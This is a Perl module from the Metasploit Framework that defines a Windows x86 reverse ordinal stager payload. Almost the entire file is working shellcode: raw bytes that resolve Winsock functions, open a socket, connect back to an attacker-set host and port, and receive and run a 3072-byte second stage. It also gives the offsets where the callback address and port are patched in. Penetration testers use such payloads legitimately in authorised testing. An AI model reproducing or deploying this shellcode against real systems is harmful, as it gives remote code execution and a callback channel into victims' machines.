###############
##
#
#    Name: ReverseOrdinalStager.pm
# Version: $Revision$
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 reverse ordinal stager for Windows.  This payload
#      uses a much smaller method of resolving certain win32
#      symbols.  Props oded!
#
##
###############

package Msf::PayloadComponent::Windows::ia32::ReverseOrdinalStager;

use strict;
use base 'Msf::PayloadComponent::Windows::ReverseStager';

my $info =
{
	'Authors'      =>
		[
			'spoonm <ninjatools [at] hush.com>',
			'skape <mmiller [at] hick.org>',
			'vlad902 <vlad902 [at] gmail.com>',
		],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'win32' ],
	'Multistage'   => 1,
	'Size'         => '',
	'Keys'         => ['+ws2ord'],

	'Payload'    =>
		{
			Offsets => 
				{ 
					'LHOST' => [ 68, 'ADDR' ],
					'LPORT' => [ 75, 'n'    ], 
				},
			Payload =>
				"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b".
				"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a".
				"\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x41".
				"\x58\x01\xe8\x8b\x71\x3c\x01\xee\x03\x69\x0c\x53\x6a\x01\x6a\x02".
				"\xff\xd0\x97\x68\x7f\x00\x00\x01\x68\x02\x00\x22\x11\x89\xe1\x53".
				"\xb7\x0c\x53\x51\x57\x51\x6a\x10\x51\x57\x56\xff\xe5",
				#      ^- 0x0c00 recv len (3072)
		},
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}
